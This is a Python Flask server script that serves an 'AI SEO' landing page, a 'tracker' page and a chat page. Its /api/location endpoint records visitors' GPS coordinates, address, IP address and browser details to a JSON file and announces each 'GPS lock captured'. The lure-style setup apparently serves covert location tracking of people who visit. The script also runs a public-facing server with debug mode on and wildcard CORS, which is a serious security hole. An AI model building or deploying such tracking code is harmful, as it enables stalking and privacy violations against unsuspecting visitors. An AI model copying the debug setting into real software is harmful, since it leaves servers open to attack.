import os
import json
import datetime
import sys
from flask import Flask, request, jsonify, send_file

app = Flask(__name__)

# Resolve file location relative to this script's directory
BASE_DIR = os.path.dirname(os.path.abspath(__file__))

# ANSI Color codes for clean, elegant console reporting (similar to your previous server)
RESET = "\033[0m"
BOLD = "\033[1m"
GREEN = "\033[92m"
BLUE = "\033[94m"
CYAN = "\033[96m"
YELLOW = "\033[93m"
RED = "\033[91m"

@app.after_request
def add_cors_headers(response):
    """Enable CORS for all endpoints to allow cross-origin requests."""
    response.headers["Access-Control-Allow-Origin"] = "*"
    response.headers["Access-Control-Allow-Methods"] = "POST, GET, OPTIONS, PUT, DELETE"
    response.headers["Access-Control-Allow-Headers"] = "Content-Type, Authorization"
    return response

@app.route('/')
def index():
    """Serve the AI SEO Landing Standalone page as the main homepage."""
    landing_page_path = os.path.join(BASE_DIR, "AI SEO Landing - Standalone.html")
    if os.path.exists(landing_page_path):
        return send_file(landing_page_path)
    else:
        # Fallback to index.html if Standalone.html is missing
        backup_path = os.path.join(BASE_DIR, "index.html")
        if os.path.exists(backup_path):
            return send_file(backup_path)
        return "Error: Landing page not found in workspace directory.", 404

@app.route('/tracker')
@app.route('/tracker.html')
def tracker_page():
    """Serve the location tracker page."""
    tracker_path = os.path.join(BASE_DIR, "tracker.html")
    if os.path.exists(tracker_path):
        return send_file(tracker_path)
    return "Error: tracker.html not found.", 404

@app.route('/riva')
def riva_chat():
    """Serve the Riva chat interface (index.html)."""
    index_path = os.path.join(BASE_DIR, "index.html")
    if os.path.exists(index_path):
        return send_file(index_path)
    return "Error: index.html (Riva Chat) not found.", 404

@app.route('/api/location', methods=['POST', 'OPTIONS'])
def handle_location():
    """Handle GPS location logs and save them in captured_locations.json."""
    if request.method == 'OPTIONS':
        return '', 200
        
    try:
        data = request.get_json(force=True)
        
        # Enrich coordinates with server and request metadata
        ip = request.headers.get("X-Forwarded-For", request.remote_addr)
        if ip and ',' in ip:
            # Handle multiple proxy IPs, extract the client IP
            ip = ip.split(',')[0].strip()
            
        user_agent = request.headers.get("User-Agent", "Unknown")
        received_time = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        
        record = {
            "server_received_at": received_time,
            "client_ip": ip,
            "user_agent": user_agent,
            "latitude": data.get("latitude"),
            "longitude": data.get("longitude"),
            "accuracy": data.get("accuracy"),
            "altitude": data.get("altitude"),
            "speed": data.get("speed"),
            "address": data.get("address"),
            "client_timestamp": data.get("timestamp")
        }
        
        # Load existing database records
        db_filename = os.path.join(BASE_DIR, "captured_locations.json")
        records = []
        if os.path.exists(db_filename):
            try:
                with open(db_filename, "r", encoding="utf-8") as f:
                    records = json.load(f)
                    if not isinstance(records, list):
                        records = []
            except Exception:
                records = []
        
        # Append and save records
        records.append(record)
        with open(db_filename, "w", encoding="utf-8") as f:
            json.dump(records, f, indent=2, ensure_ascii=False)
            
        # Elegant premium terminal panel logging
        lat = record['latitude']
        lon = record['longitude']
        acc = record['accuracy']
        addr = record['address'] or "N/A"
        
        print("\n" + "="*80)
        print(f"[GPS LOCK] {BOLD}{GREEN}NEW HIGH-ACCURACY GPS LOCK CAPTURED!{RESET}")
        print("="*80)
        print(f"[TIME]       {BOLD}Server Time:{RESET}   {received_time}")
        print(f"[IP]         {BOLD}Client IP:{RESET}     {ip}")
        # Format lat/lon safely if they exist
        lat_str = f"{lat:.6f}" if isinstance(lat, (int, float)) else str(lat)
        lon_str = f"{lon:.6f}" if isinstance(lon, (int, float)) else str(lon)
        print(f"[LAT/LON]    {BOLD}Coordinates:{RESET}   {BOLD}{CYAN}{lat_str}, {lon_str}{RESET}")
        acc_str = f"{acc:.2f} meters" if isinstance(acc, (int, float)) else str(acc)
        print(f"[ACCURACY]   {BOLD}Accuracy:{RESET}      {acc_str}")
        print(f"[ADDRESS]    {BOLD}Address:{RESET}       {BOLD}{YELLOW}{addr}{RESET}")
        print(f"[USER-AGENT] {BOLD}User Agent:{RESET}    {user_agent[:70]}...")
        print("="*80)
        print(f"[SAVED]      {GREEN}Saved successfully to: {BOLD}{os.path.basename(db_filename)}{RESET}\n")
        
        return jsonify({"status": "success", "message": "Location locked and synced successfully."}), 200
        
    except Exception as e:
        print(f"{RED}[ERROR] Failed to capture location: {str(e)}{RESET}")
        return jsonify({"status": "error", "message": str(e)}), 400

if __name__ == '__main__':
    # Default Flask port requested is 5000.
    # host='0.0.0.0' binds to all interfaces, which is essential for VPS deployment
    port_num = 5000
    if len(sys.argv) > 1:
        try:
            port_num = int(sys.argv[1])
        except ValueError:
            pass
            
    print("\n" + "*"*60)
    print(f"[ACTIVE] {BOLD}{GREEN}FLASK VPS SERVER ACTIVE & LISTENING{RESET}")
    print("*"*60)
    print(f"[URL]  {BOLD}Landing Page URL:{RESET}   {BOLD}{CYAN}http://localhost:{port_num}/{RESET}")
    print(f"[URL]  {BOLD}Tracker Page URL:{RESET}   {BOLD}{CYAN}http://localhost:{port_num}/tracker{RESET}")
    print(f"[URL]  {BOLD}Riva Chat URL:{RESET}      {BOLD}{CYAN}http://localhost:{port_num}/riva{RESET}")
    print(f"[INFO] {BOLD}VPS Ready:{RESET}          Hostinger configured to run on 0.0.0.0:{port_num}")
    print("*"*60 + "\n")
    
    app.run(host='0.0.0.0', port=port_num, debug=True)
